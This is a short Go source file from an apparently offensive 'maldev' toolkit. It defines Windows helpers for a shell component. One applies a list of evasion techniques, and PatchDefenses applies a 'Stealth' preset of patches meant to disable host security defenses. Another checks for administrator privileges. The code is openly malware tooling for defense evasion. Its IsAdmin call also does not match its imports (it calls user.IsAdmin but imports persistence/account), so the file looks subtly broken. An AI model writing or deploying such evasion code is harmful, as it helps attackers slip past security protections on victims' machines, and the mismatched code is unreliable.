//go:build windows

package shell

import (
	"fmt"
	"strings"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
	"github.com/oioio-space/maldev/persistence/account"
)

// applyEvasion applies the provided evasion techniques on Windows.
// Returns an aggregate error listing all failed techniques, or nil.
func applyEvasion(techniques []evasion.Technique, caller evasion.Caller) error {
	if len(techniques) == 0 {
		return nil
	}
	errs := evasion.ApplyAll(techniques, caller)
	if len(errs) == 0 {
		return nil
	}
	parts := make([]string, 0, len(errs))
	for name, err := range errs {
		parts = append(parts, fmt.Sprintf("%s: %v", name, err))
	}
	return fmt.Errorf("evasion failures: %s", strings.Join(parts, "; "))
}

// PatchDefenses applies all available evasion patches.
func PatchDefenses() error {
	errs := evasion.ApplyAll(preset.Stealth(), nil)
	if len(errs) > 0 {
		return fmt.Errorf("evasion: %d technique(s) failed", len(errs))
	}
	return nil
}

// IsAdmin checks if the current process has admin privileges.
// Delegates to win/user.IsAdmin to avoid duplicating SID/token logic.
func IsAdmin() bool {
	return user.IsAdmin()
}
